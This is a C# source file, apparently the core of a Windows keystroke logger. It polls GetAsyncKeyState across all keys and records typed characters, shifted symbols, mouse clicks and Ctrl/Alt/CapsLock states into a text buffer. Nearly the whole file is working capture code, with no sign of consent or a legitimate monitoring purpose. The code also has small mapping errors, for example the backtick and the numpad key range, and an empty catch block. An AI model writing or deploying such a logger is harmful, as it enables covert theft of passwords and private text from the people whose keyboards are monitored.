using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Logger.Core
{
    public class KeyboardManager
    {
        private static bool _altOn;
        private static bool _ctrlOn;
        private static bool _capsLockOn;

        private static bool ControlKey => Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000);

        private static bool ShiftKey => Convert.ToBoolean(GetAsyncKeyState(Keys.ShiftKey) & 0x8000);

        private static bool CapsLock => Convert.ToBoolean(GetAsyncKeyState(Keys.CapsLock) & 0x8000);

        private static bool AltKey => Convert.ToBoolean(GetAsyncKeyState(Keys.Menu) & 0x8000);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        public static string GetKeys()
        {
            var keyBuffer = string.Empty;

            try
            {
                foreach (var i in from int i in Enum.GetValues(typeof (Keys)) where GetAsyncKeyState(i) == -32767 select i)
                {
                    if (ControlKey)
                    {
                        if (!_ctrlOn)
                        {
                            _ctrlOn = true;
                            keyBuffer += "<Ctrl=On>";
                        }
                    }
                    else
                    {
                        if (_ctrlOn)
                        {
                            _ctrlOn = false;
                            keyBuffer += "<Ctrl=Off>";
                        }
                    }

                    if (AltKey)
                    {
                        if (!_altOn)
                        {
                            _altOn = true;
                            keyBuffer += "<Alt=On>";
                        }
                    }
                    else
                    {
                        if (_altOn)
                        {
                            _altOn = false;
                            keyBuffer += "<Alt=Off>";
                        }
                    }

                    if (CapsLock)
                    {
                        if (!_capsLockOn)
                        {
                            _capsLockOn = true;
                            keyBuffer += "<CapsLock=On>";
                        }
                    }
                    else
                    {
                        if (_capsLockOn)
                        {
                            _capsLockOn = false;
                            keyBuffer += "<CapsLock=Off>";
                        }
                    }

                    var keyName = Enum.GetName(typeof (Keys), i);

                    switch (keyName)
                    {
                        case "LButton":
                            keyBuffer += "<LMouse>";
                            break;
                        case "RButton":
                            keyBuffer += "<RMouse>";
                            break;
                        case "Back":
                            keyBuffer += "<Backspace>";
                            break;
                        case "Space":
                            keyBuffer += " ";
                            break;
                        case "Return":
                            keyBuffer += "<Enter>";
                            break;
                        case "ControlKey":
                            continue;
                        case "LControlKey":
                            continue;
                        case "RControlKey":
                            continue;
                        case "ShiftKey":
                            continue;
                        case "LShiftKey":
                            continue;
                        case "RShiftKey":
                            continue;
                        case "Delete":
                            keyBuffer += "<Del>";
                            break;
                        case "Insert":
                            keyBuffer += "<Ins>";
                            break;
                        case "Home":
                            keyBuffer += "<Home>";
                            break;
                        case "End":
                            keyBuffer += "<End>";
                            break;
                        case "Tab":
                            keyBuffer += "<Tab>";
                            break;
                        case "Prior":
                            keyBuffer += "<Page Up>";
                            break;
                        case "PageDown":
                            keyBuffer += "<Page Down>";
                            break;
                        case "RWin":
                        case "LWin":
                            keyBuffer += "<Win>";
                            break;
                    }

                    /* ********************************************* *
                    * Detect key based off ShiftKey Toggle
                    * ********************************************** */
                    keyName = i.ToString();

                    if (ShiftKey)
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char) i;
                        }
                        else
                            switch (keyName)
                            {
                                case "49":
                                    keyBuffer += "!";
                                    break;
                                case "50":
                                    keyBuffer += "@";
                                    break;
                                case "51":
                                    keyBuffer += "#";
                                    break;
                                case "52":
                                    keyBuffer += "$";
                                    break;
                                case "53":
                                    keyBuffer += "%";
                                    break;
                                case "54":
                                    keyBuffer += "^";
                                    break;
                                case "55":
                                    keyBuffer += "&";
                                    break;
                                case "56":
                                    keyBuffer += "*";
                                    break;
                                case "57":
                                    keyBuffer += "(";
                                    break;
                                case "48":
                                    keyBuffer += ")";
                                    break;
                                case "192":
                                    keyBuffer += "~";
                                    break;
                                case "189":
                                    keyBuffer += "_";
                                    break;
                                case "187":
                                    keyBuffer += "+";
                                    break;
                                case "219":
                                    keyBuffer += "{";
                                    break;
                                case "221":
                                    keyBuffer += "}";
                                    break;
                                case "220":
                                    keyBuffer += "|";
                                    break;
                                case "186":
                                    keyBuffer += ":";
                                    break;
                                case "222":
                                    keyBuffer += "\"";
                                    break;
                                case "188":
                                    keyBuffer += "<";
                                    break;
                                case "190":
                                    keyBuffer += ">";
                                    break;
                                case "191":
                                    keyBuffer += "?";
                                    break;
                            }
                    }
                    else
                    {
                        if (i >= 65 && i <= 122)
                        {
                            keyBuffer += (char) (i + 32);
                        }
                        else
                            switch (keyName)
                            {
                                case "49":
                                    keyBuffer += "1";
                                    break;
                                case "50":
                                    keyBuffer += "2";
                                    break;
                                case "51":
                                    keyBuffer += "3";
                                    break;
                                case "52":
                                    keyBuffer += "4";
                                    break;
                                case "53":
                                    keyBuffer += "5";
                                    break;
                                case "54":
                                    keyBuffer += "6";
                                    break;
                                case "55":
                                    keyBuffer += "7";
                                    break;
                                case "56":
                                    keyBuffer += "8";
                                    break;
                                case "57":
                                    keyBuffer += "9";
                                    break;
                                case "48":
                                    keyBuffer += "0";
                                    break;
                                case "189":
                                    keyBuffer += "-";
                                    break;
                                case "187":
                                    keyBuffer += "=";
                                    break;
                                case "92":
                                    keyBuffer += "`";
                                    break;
                                case "219":
                                    keyBuffer += "[";
                                    break;
                                case "221":
                                    keyBuffer += "]";
                                    break;
                                case "220":
                                    keyBuffer += "\\";
                                    break;
                                case "186":
                                    keyBuffer += ";";
                                    break;
                                case "222":
                                    keyBuffer += "'";
                                    break;
                                case "188":
                                    keyBuffer += ",";
                                    break;
                                case "190":
                                    keyBuffer += ".";
                                    break;
                                case "191":
                                    keyBuffer += "/";
                                    break;
                            }
                    }
                }
            }
            catch
            {
            }

            return keyBuffer;
        }
    }
}